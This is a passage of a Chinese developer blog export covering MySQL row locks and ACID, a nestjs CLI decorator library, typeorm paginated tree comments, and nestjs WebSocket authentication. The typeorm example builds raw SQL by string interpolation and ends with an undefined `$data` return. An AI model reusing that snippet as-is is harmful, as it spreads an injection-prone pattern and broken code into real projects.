<p>在MySQL中，行级锁并不是直接锁记录，而是锁索引。索引分为主键索引和非主键索引两种，如果一条sql语句操作了主键索引，MySQL就会锁定这条主键索引；如果一条语句操作了非主键索引，MySQL会先锁定该非主键索引，再锁定相关的主键索引。 在UPDATE、DELETE操作时，MySQL不仅锁定WHERE条件扫描过的所有索引记录，而且会锁定相邻的键值，即所谓的next-key locking。</p>
<p>当两个事务同时执行，一个锁住了主键索引，在等待其他相关索引。另一个锁定了非主键索引，在等待主键索引。这样就会发生死锁。</p>
<p>发生死锁后，InnoDB一般都可以检测到，并使一个事务释放锁回退，另一个获取锁完成事务。</p>
<p>有多种方法可以避免死锁，这里只介绍常见的三种</p>
<ol>
<li>如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。</li>
<li>在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁产生概率；</li>
<li>对于非常容易产生死锁的业务部分，可以尝试使用升级锁定颗粒度，通过表级锁定来减少死锁产生的概率；</li>
</ol>
<h3 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h3><blockquote>
<p>在事务处理的ACID属性中，<strong>一致性是最基本的属性</strong>，其它的三个属性都为了保证一致性而存在的。</p>
</blockquote>
<p>所谓一致性，指的是数据处于一种有意义的状态，这种状态是语义上的而不是语法上的。最常见的例子是转帐。例如从帐户A转一笔钱到帐户B上，如果帐户A上的钱减少了，而帐户B上的钱却没有增加，那么我们认为此时数据处于不一致的状态。</p>
<p>在数据库实现的场景中，一致性可以分为数据库外部的一致性和数据库内部的一致性。前者由外部应用的编码来保证，即某个应用在执行转帐的数据库操作时，必须在同一个事务内部调用对帐户A和帐户B的操作。如果在这个层次出现错误，这不是数据库本身能够解决的，也不属于我们需要讨论的范围。后者由数据库来保证，即在同一个事务内部的一组操作必须全部执行成功（或者全部失败）。这就是事务处理的原子性。</p>
<blockquote>
<p>为了实现原子性，需要通过日志：将所有对数据的更新操作都写入日志，如果一个事务中的一部分操作已经成功，但以后的操作，由于断电/系统崩溃/其它的软硬件错误而无法继续，则通过回溯日志，将已经执行成功的操作撤销，从而达到“全部操作失败”的目的。最常见的场景是，数据库系统崩溃后重启，此时数据库处于不一致的状态，必须先执行一个crashrecovery的过程：读取日志进行REDO（重演将所有已经执行成功但尚未写入到磁盘的操作，保证持久性），再对所有到崩溃时尚未成功提交的事务进行UNDO（撤销所有执行了一部分但尚未提交的操作，保证原子性）。crashrecovery结束后，数据库恢复到一致性状态，可以继续被使用。</p>
</blockquote>
<p>原子性并不能完全保证一致性。在多个事务并行进行的情况下，即使保证了每一个事务的原子性，仍然可能导致数据不一致的结果。例如，事务1需要将100元转入帐号A：先读取帐号A的值，然后在这个值上加上100。但是，在这两个操作之间，另一个事务2修改了帐号A的值，为它增加了100元。那么最后的结果应该是A增加了200元。但事实上，事务1最终完成后，帐号A只增加了100元，因为事务2的修改结果被事务1覆盖掉了。</p>
<p>为了保证并发情况下的一致性，引入了隔离性，即保证每一个事务能够看到的数据总是一致的，就好象其它并发事务并不存在一样。用术语来说，就是多个事务并发执行后的状态，和它们串行执行后的状态是等价的。所谓<strong>隔离性的实现方式就是各种类型的锁</strong>。</p>
<p><br/><br/><br/><br><em>哈哈哈哈哈哈 是不是看的头大 我也是 :)</em></p>
<p><br/><br/><br/><br/><br/><br/></p>
<p>资料：</p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E4%BA%8B%E5%8B%99%E9%9A%94%E9%9B%A2">事务隔离</a></p>
<p><a href="http://www.hollischuang.com/archives/914">MySQL中的行级锁,表级锁,页级锁</a></p>
<p><a href="https://www.zhihu.com/question/30272728">数据库事务原子性、一致性是怎样实现的</a></p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>acid</tag>
      </tags>
  </entry>
  <entry>
    <title>nest命令行工具</title>
    <url>/2023/07/09/nest-command-tool/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p><code>nest</code>官方未提供自定义命令的模块，所以出现很多功能丰富的第三方库，比如的有<a href="https://github.com/Pop-Code/nestjs-console">nestjs-console</a>(基于<a href="https://github.com/tj/commander.js">commande</a>)、<a href="https://gitlab.com/aa900031/nestjs-command">nestjs-command</a>(基于<a href="https://github.com/yargs/yargs">yargs</a>)，两者都提供了完善的命令行工具所需配置，引入项目及使用也很方便，但都不支持批量注册命令，每个命令的注册都要提供完整的配置信息，对于某些场景可能不是特别合适(比如偷懒)，所以奔着学习的目的新开一个项目实现缺失的功能</p>
<h3 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h3><p>整个项目功能非常简单，逻辑也很清晰，主要有以下三点：</p>
<ol>
<li>遍历出<code>nest</code>所有<code>Module</code>的<code>providers</code>，对使用了指定装饰器的<code>provider</code>及其属性做处理</li>
<li>将处理结果组装为合法的<code>yargs</code>命令，并且注册至<code>yargs</code></li>
<li>提供<code>entrypoint</code>，用于上述步骤1和2及命令的执行</li>
</ol>
<p>具体实现可以在<a href="https://github.com/tashuo/nest-command">nest-command</a>项目中查看</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>项目提供了<code>@Command</code>、<code>@Commands</code>和<code>@OriginYargsCommand</code>三个装饰器，分别用于单个命令、多个命令及原生yargs命令的注册.</p>
<span id="more"></span>
<ol>
<li><p>@Command</p>
<p> 直接声明单个命令，可以提供完整的配置，也可使用自动生成的配置，如下所示：</p>
 <figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"># ./src/simple.<span class="property">command</span>.<span class="property">ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> ‘<span class="meta">@nestjs</span>/common’;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Command</span> &#125; <span class="keyword">from</span> ‘nestjs-command’;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">SimpleCommand</span> &#123;</span><br><span class="line">   	<span class="meta">@Command</span>(&#123;</span><br><span class="line">       	<span class="attr">command</span>: ‘<span class="attr">simple</span>:test1 &lt;p1&gt;’,</span><br><span class="line">       	<span class="attr">describe</span>: ‘<span class="attr">simple</span>:test1’,</span><br><span class="line">       	<span class="attr">params</span>: [</span><br><span class="line">           	&#123;</span><br><span class="line">               	<span class="attr">name</span>: ‘p1’,</span><br><span class="line">               	<span class="attr">type</span>: ‘positional’,</span><br><span class="line">               	<span class="attr">value</span>: &#123;</span><br><span class="line">                   <span class="attr">type</span>: ‘<span class="built_in">string</span>’</span><br><span class="line">               	&#125;</span><br><span class="line">           	&#125;</span><br><span class="line">       	]</span><br><span class="line">   	&#125;)</span><br><span class="line">   	<span class="title function_">test1</span>(<span class="params">p1: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">       	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`test1:<span class="subst">$&#123;p1&#125;</span>`</span>);</span><br><span class="line">   	&#125;</span><br><span class="line"></span><br><span class="line">   	<span class="meta">@Command</span>()</span><br><span class="line">   	<span class="keyword">async</span> <span class="title function_">test2</span>(<span class="params">p1: <span class="built_in">number</span>, p2 = ‘abc’</span>) &#123;</span><br><span class="line">       	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`test2:<span class="subst">$&#123;p1&#125;</span>:<span class="subst">$&#123;p2&#125;</span>`</span>);</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> 假如<code>@Command</code>未配置params参数，会自动获取方法的参数并注册至yargs，但由于无法获取运行时的参数名所以自动注册的参数名无任何逻辑意义，直接看下面help输出中的<em>test2</em>就懂啥意思了，但也算为了偷懒少写代码提供了一条不归路：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">npm run console:dev --<span class="built_in">help</span></span></span><br><span class="line">Commands:</span><br><span class="line">    cli simple:test1 &lt;p1&gt;           simple:test1</span><br><span class="line">    cli test2 &lt;number1&gt; [unknown2]  test2(auto generated)</span><br></pre></td></tr></table></figure></li>
<li><p>@Commands</p>
 <figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"># ./test/multiple.<span class="property">command</span>.<span class="property">ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Command</span>, <span class="title class_">Commands</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;../src/decorators&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="meta">@Commands</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">MultipleCommand</span> &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">test3</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt;(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(<span class="string">&#x27;test3&#x27;</span>), <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">test4</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;test4&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Command</span>(&#123;</span><br><span class="line">        <span class="attr">command</span>: <span class="string">&#x27;multiple:test5&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">test5</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;test5&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 使用<code>@Commands</code>装饰的类会自动将所有的方法注册为独立的command，<strong>便于批量注册</strong>，但由于typescript装饰器只有编译时才会封装<code>design:*</code>等metadata信息，动态装饰器无法获取方法的参数，所以<strong>此种方式只适合不需参数的方法</strong></p>
</li>
<li><p>@OriginYargsCommand</p>
<p> 具体示例可查看<a href="https://github.com/tashuo/nest-command/blob/master/test/original.command.ts">origin.command.ts</a></p>
<p> 使用<code>@OriginYargsCommand</code>装饰的类也可以直接注册为command，<strong>便于复用已有的yargs command</strong>，所以必须保证该类继承了<code>yargs.CommandModule</code>，是一个标准的yargs command</p>
<p> 为啥会有这样一个feature呢，初衷是想重载<code>typeorm</code>的一些内置command，后面发现这些command没有export…先留着吧</p>
</li>
</ol>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>欢迎使用和交流～</p>
]]></content>
      <categories>
        <category>typescript</category>
        <category>nestjs</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>jest</tag>
        <tag>javascript</tag>
        <tag>yargs</tag>
        <tag>commander</tag>
      </tags>
  </entry>
  <entry>
    <title>nestjs-typeorm树形查询</title>
    <url>/2023/09/01/nestjs-db-tree-query/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>树形结构是一种常用的存储查询模型，比如后台菜单或评论列表，展开就是一棵树，对于数据库的表来讲，意味着自引用，即有一个外键字段关联本表的主键，该外键字段一般称为<code>parent_id</code>，由该字段串联起整颗树的结构，在数据量不大的场景中，单纯一个<code>parent_id</code>即可胜任树形数据的查询，只需对全表数据循环遍历组装，这种方案在前者后台菜单中比较常用</p>
<p>当数据超过一定量级，一次性load全部数据并循环遍历对于io和cpu都是很大的负担也不现实，此时一般增加辅助字段来提升查询性能(空间换时间)，以及满足更多样性的查询需求。这里只介绍一种常用的方案-<code>path</code>，类似于unix的文件夹层级，该字段存储从根节点到该节点的整条路径，比如<code>100.120.200.</code>：代表这棵树根节点为100，该节点为200，该节点的父节点为120，最大的好处是比单纯的<code>parent_id</code>更容易获取任意节点的所有子节点</p>
<p>很多orm都内置了树形模型方案，包括typeorm，具体可查看文档<a href="https://typeorm.io/tree-entities">Tree Entities</a>，而<code>Materialized Path</code>就是上述<code>path</code>方案的实现，开箱即用</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>不同场景有不同的方案需求，我们限定当前的需求是评论列表，结合当前各大平台如知乎的交互方案，更细化的需求是<strong>二级评论列表(非完整树形)，第一层为所有的一级评论，一级评论分页加载所有的子评论</strong></p>
<p>继续看typeorm提供的查询方案，有几个相关的方法：<code>findTrees</code>、<code>findRoots</code>、<code>findDescendants</code>、和<code>findDescendantsTree</code>：</p>
<ul>
<li><code>findTrees</code>：一次性返回所有的评论树</li>
<li><code>findRoots</code>：一次性返回所有的根节点</li>
<li><code>findDescendants</code>/<code>findDescendantsTree</code>：返回一棵树<span id="more"></span>
貌似无法直接处理子评论分页加载的逻辑？</li>
</ul>
<h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>通过<code>Materialized Path</code>生成的表结构可看到字段<code>mpath</code>，同样为了便于直接查询出节点的父节点，增加一个字段<code>parentId</code>，整个Entity的关键代码如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"># comment.<span class="property">entity</span>.<span class="property">ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    <span class="title class_">BaseEntity</span>,</span><br><span class="line">    <span class="title class_">TreeParent</span>,</span><br><span class="line">    <span class="title class_">Tree</span>,</span><br><span class="line">    <span class="title class_">Entity</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Tree</span>(<span class="string">&#x27;materialized-path&#x27;</span>)</span><br><span class="line"><span class="meta">@Entity</span>(<span class="string">&#x27;content_comments&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CommentEntity</span> <span class="keyword">extends</span> <span class="title class_ inherited__">BaseEntity</span> &#123;</span><br><span class="line">    <span class="meta">@TreeParent</span>(&#123; <span class="attr">onDelete</span>: <span class="string">&#x27;CASCADE&#x27;</span> &#125;)</span><br><span class="line">    <span class="attr">parent</span>: <span class="title class_">CommentEntity</span> | <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目前的问题是单纯根据<code>typeorm</code>暴露的方法无法对子节点进行分页加载，我们的解决方案围绕隐藏字段<code>mpath</code>进行:</p>
<ol>
<li>查询当前页的根节点列表</li>
<li>根据<code>mpath</code>字段查询出上述根节点的子节点列表(记得CommentEntity也需要添加该字段)</li>
</ol>
<p>关键代码如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CommentService</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="attr">repository</span>: <span class="title class_">CommentEntity</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"><span class="keyword">protected</span> repository: CommentRepository</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">repository</span> = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询一级评论，附带固定数量的二级评论(可自定义排序规则)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getPostComments</span>(<span class="params"></span></span><br><span class="line"><span class="params">        post: PostEntity,</span></span><br><span class="line"><span class="params">        loginUserId: <span class="built_in">string</span> | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">        page = <span class="number">1</span>,</span></span><br><span class="line"><span class="params">        limit = <span class="number">10</span>,</span></span><br><span class="line"><span class="params">        childrenCommentCount = <span class="number">3</span>,</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        <span class="comment">// 1. 查询当前页的根节点列表</span></span><br><span class="line">        <span class="keyword">const</span> query = <span class="title class_">CommentEntity</span>.<span class="title function_">createQueryBuilder</span>(<span class="string">&#x27;comment&#x27;</span>)</span><br><span class="line">            .<span class="title function_">where</span>(<span class="string">`comment.postId = :postId`</span>, &#123; <span class="attr">postId</span>: post.<span class="property">id</span> &#125;)</span><br><span class="line">            .<span class="title function_">andWhere</span>(<span class="string">&#x27;comment.parentId IS NULL&#x27;</span>)</span><br><span class="line">            .<span class="title function_">orderBy</span>(<span class="string">&#x27;comment.id&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>)</span><br><span class="line">            .<span class="title function_">skip</span>((page - <span class="number">1</span>) * limit)</span><br><span class="line">            .<span class="title function_">take</span>(limit);</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> query.<span class="title function_">getManyAndCount</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> rootCommentIds = data[<span class="number">0</span>].<span class="title function_">map</span>(<span class="function">(<span class="params">v: CommentEntity</span>) =&gt;</span> v.<span class="property">id</span>);</span><br><span class="line">        <span class="keyword">if</span> (rootCommentIds.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 2. 根据`mpath`字段查询出上述根节点的子节点列表</span></span><br><span class="line">            <span class="keyword">const</span> sql = <span class="string">`SELECT id, p FROM (</span></span><br><span class="line"><span class="string">                SELECT *, substring(mpath, 1, instr(mpath, &#x27;.&#x27;)) as p, ROW_NUMBER() OVER (PARTITION BY substring(mpath, 1, instr(mpath, &#x27;.&#x27;)) ORDER BY id DESC) AS n</span></span><br><span class="line"><span class="string">                FROM content_comments</span></span><br><span class="line"><span class="string">                where parentId is not null and (<span class="subst">$&#123;rootCommentIds</span></span></span><br><span class="line"><span class="subst"><span class="string">                    .map((v: <span class="built_in">string</span>) =&gt; <span class="string">` mpath like &#x27;<span class="subst">$&#123;v&#125;</span>.%&#x27; or `</span>)</span></span></span><br><span class="line"><span class="subst"><span class="string">                    .join(<span class="string">&#x27;&#x27;</span>)&#125;</span> false)</span></span><br><span class="line"><span class="string">            ) AS x WHERE n &lt;= <span class="subst">$&#123;childrenCommentCount&#125;</span>`</span>;</span><br><span class="line">            <span class="keyword">const</span> children = <span class="keyword">await</span> <span class="title class_">CommentEntity</span>.<span class="title function_">getRepository</span>().<span class="property">manager</span>.<span class="title function_">query</span>(sql);</span><br><span class="line">            <span class="keyword">const</span> rootChildrenIds = <span class="title function_">groupBy</span>(children, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> childrenComments = <span class="title function_">keyBy</span>(</span><br><span class="line">                <span class="keyword">await</span> <span class="title class_">CommentEntity</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">                    <span class="attr">where</span>: &#123;</span><br><span class="line">                        <span class="attr">id</span>: <span class="title class_">In</span>(children.<span class="title function_">map</span>(<span class="function">(<span class="params">v: CommentEntity</span>) =&gt;</span> v.<span class="property">id</span>)),</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">relations</span>: [<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;parent&#x27;</span>, <span class="string">&#x27;parent.user&#x27;</span>],</span><br><span class="line">                    <span class="attr">order</span>: &#123;</span><br><span class="line">                        <span class="attr">id</span>: <span class="string">&#x27;DESC&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;),</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">            );</span><br><span class="line">            data[<span class="number">0</span>] = data[<span class="number">0</span>].<span class="title function_">map</span>(<span class="function">(<span class="params">v</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> k = <span class="string">`<span class="subst">$&#123;v.id&#125;</span>.`</span>;</span><br><span class="line">                v.<span class="property">children</span> = [];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_">isNil</span>(rootChildrenIds[k]) &amp;&amp; rootChildrenIds[k].<span class="property">length</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    v.<span class="property">children</span> = rootChildrenIds[k].<span class="title function_">map</span>(<span class="function">(<span class="params">c: CommentEntity</span>) =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> childrenComments[c.<span class="property">id</span>];</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> v;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其他处理略</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键逻辑在第2步，使用<code>mysql</code>的<strong>窗口函数</strong>和<code>mpath</code>字段获取固定数量的自节点</p>
<p>但是执行会报错，因为<code>mpath</code>是隐藏字段，不可直接对其做查询操作，需要设置为可见：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CommentService</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="attr">repository</span>: <span class="title class_">CommentEntity</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"><span class="keyword">protected</span> repository: CommentRepository</span>) &#123;</span><br><span class="line">        <span class="comment">// 设置mpath可见</span></span><br><span class="line">        repository.<span class="property">metadata</span>.<span class="property">columns</span> = repository.<span class="property">metadata</span>.<span class="property">columns</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (x.<span class="property">databaseName</span> === <span class="string">&#x27;mpath&#x27;</span>) &#123;</span><br><span class="line">                x.<span class="property">isVirtual</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">repository</span> = repository;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询速度取决于数据量和窗口函数的性能，后续的优化方案比如<code>mpath</code>加索引等不再赘述；当数据量继续增长时单纯使用<code>mysql</code>也是远远不够的，需要引入其他性能更高的技术栈，也不在本文讨论范围</p>
<h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><p>欢迎批评指正出文中的错误及不合理之处，欢迎评论交流</p>
]]></content>
      <categories>
        <category>typescript</category>
        <category>nestjs</category>
      </categories>
      <tags>
        <tag>typeorm</tag>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title>nestjs websocket 实现私聊、系统推送</title>
    <url>/2023/04/14/nestjs-websocket/</url>
    <content><![CDATA[<h2 id="Nestjs-websocket开发记录"><a href="#Nestjs-websocket开发记录" class="headerlink" title="Nestjs websocket开发记录"></a>Nestjs websocket开发记录</h2><p><a href="https://docs.nestjs.com/websockets/gateways">官方文档</a>介绍的比较详细了，但实际开发过程中还是遇到了不少问题，在此做一下记录.</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h3><blockquote>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API</a></p>
</blockquote>
<h3 id="流行的websocket库"><a href="#流行的websocket库" class="headerlink" title="流行的websocket库"></a>流行的websocket库</h3><p><a href="https://github.com/websockets/ws">ws</a></p>
<p><a href="https://github.com/socketio/socket.io">socket.io</a></p>
<h3 id="Nest配套"><a href="#Nest配套" class="headerlink" title="Nest配套"></a>Nest配套</h3><blockquote>
<p>In Nest, a gateway is simply a class annotated with @WebSocketGateway() decorator. Technically, gateways are platform-agnostic which makes them compatible with any WebSockets library once an adapter is created. There are two WS platforms supported out-of-the-box: socket.io and ws.</p>
</blockquote>
<p>nest提供了<code>gateway</code>的概念，<code>gateway</code>与平台无关，底层可以适配任何websocket库，此处选用更为流行的<code>socket.io</code>做为示例，而且项目切换驱动的代码改动非常小，即便后面要改为<code>ws</code>也没有太大负担，架构设计甚是优雅.</p>
<h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pnpm i --save @nestjs/websockets @nestjs/platform-socket.io socket.io</span><br></pre></td></tr></table></figure>
<p><em>使用<code>ws</code>库：</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pnpm i --save @nestjs/websockets @nestjs/platform-ws ws</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h3><p><code>gateway</code>相当于websocket server，可以设置websocket监听的端口(注意此处不要与http端口冲突)、可以监听所有客户端连接的生命周期事件，业务层面所有类型的消息监听和发送也是在此类中完成，通过<code>@SubscribeMessage</code>装饰器可以声明方法监听的事件类型及处理逻辑.</p>
<p><code>gateway</code>写好后在<code>Module</code>中声明为<code>Provider</code>就会生效，可以用Postman进行测试，需要注意的是，<code>socket.io</code>server必须使用<code>socket.io</code>client才能通信，所以测试时需要根据使用的库选用不同的客户端进行测试，Postman的websocket request支持原生和<code>socket.io</code>两种类型，别跟我一样选错了在那儿绞尽脑汁.</p>
<h3 id="鉴权"><a href="#鉴权" class="headerlink" title="鉴权"></a>鉴权</h3><p>和http一样，当一个websocket客户端发起连接请求和消息时服务端需要判断其合法性及身份，此处涉及到两个逻辑，<strong>建立websocket连接</strong>和<strong>处理消息</strong>.</p>
<p>websocket连接是由http请求<code>upgrade</code>成功后创建，对应于<code>gateway</code>的<code>handleConnection</code>方法，而nest的<code>guard</code>本身也适用于<code>gateway</code>，但不幸的是只作用于<code>@SubscribeMessage</code>装饰的方法，连接的生命周期事件不受影响，所以需要在<code>handleConnection</code>中单独做鉴权，其他<code>@SubscribeMessage</code>方法通过<code>guard</code>统一处理；</p>
<p>但后面又发现一个问题，<code>handleConnection</code>调用时服务端其实已经跟客户端建立连接</p>
<blockquote>
<p>WebSocket establishes the connection (either before or at the beginning of handleConnection)</p>
</blockquote>
<p>在连接建立和鉴权逻辑执行完毕这段时间的所有消息不受鉴权逻辑影响，虽然鉴权逻辑可能不需要多少时间，但bug就是bug，本着严谨的态度，又找到一个更为合理的方案：<code>allowRequest</code></p>
<p><a href="https://user-images.githubusercontent.com/11506653/82481833-ef199780-9aa3-11ea-93de-ae6e7b214072.png"><img src="https://user-images.githubusercontent.com/11506653/82481833-ef199780-9aa3-11ea-93de-ae6e7b214072.png" alt="ixXO7d.md.png"></a></p>
<p><code>allowRequest</code>也是在<code>upgrade</code>时调用，而且是成功后才会创建websocket连接，符合我们的鉴权要求，需要配合<code>adapter</code>使用，<a href="https://docs.nestjs.com/websockets/adapter">https://docs.nestjs.com/websockets/adapter</a></p>
<p>最终根据以上的调研，大致确定了以下的鉴权方案：</p>
<ol>
<li>自定义<code>Adapter</code>的<code>createIOServer</code>方法中通过<code>allowRequest</code>绑定的函数进行鉴权，用于确保所有建立的websocket连接都是合法的</li>
<li><code>gateway</code>的<code>handleConnection</code>中根据jwt解析出用户信息，跟当前connection做关联，后面所有的<code>@SubscribeMessage</code>方法都可以直接使用该connection的用户信息</li>
<li><code>@SubscribeMessage</code>所有方法使用通用的<code>guard</code>做鉴权，此处的鉴权本质上是对connection活跃性的探测，如果发现不活跃了直接断开连接让客户端重连，此处需要结合心跳逻辑，活跃性由心跳维持，假如长时间未收到心跳包，则判定该客户端连接异常或掉线.</li>
</ol>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>该方案实行的前提是客户端在建立连接后不会更换token，假如由于客户端逻辑异常，同一条连接上出现了不同的token，整个业务数据就会有问题，因为当前方案是根据连接建立时传入的token绑定用户信息的，后续的通信不会对token进行校验，无论是否传了新的token或不传token都会作为该用户的消息进行处理.</p>
<p>可以在该仓库找到所有的代码：<a href="https://github.com/tashuo/nest-websocket">https://github.com/tashuo/nest-websocket</a></p>
]]></content>
      <categories>
        <category>typescript</category>
        <category>nestjs</category>
      </categories>
      <tags>
        <tag>socket.io</tag>
        <tag>webscoket</tag>
      </tags>
  </entry>
  <entry>
    <title>新的开始</title>
    <url>/2016/12/17/new-begining/</url>
    <content><![CDATA[<p>从厦门回广州也有一段时日，终于有心思又折腾起博客来。</p>
<p>从最开始自己写的简陋的博客程序，接着转Wordpress，再之后就是托管在github gh-pages的静态页面，辗转多次积攒许久的博客已无影踪，就像丢失一件陪伴多年很少用的劳什子，依然会心有戚戚，毕竟是’我’的东西，就如已消逝的过去的我的遗物，没经过’他’的同意擅自丢弃，也不太好吧。</p>
<p>所以就重新开始权当对过去的一点补偿，关于生活，关于工作，关于兴趣或多或少都要表达出来，要么是话语要么就是文字，希望自己能坚持下去，加油 😬</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>广州</tag>
      </tags>
  </entry>
  <entry>
    <title>《人间失格》 - 第一手扎</title>
    <url>/2017/01/04/no-longer-human-1/</url>
    <content><![CDATA[<p>我这一生，尽是可耻之事</p>
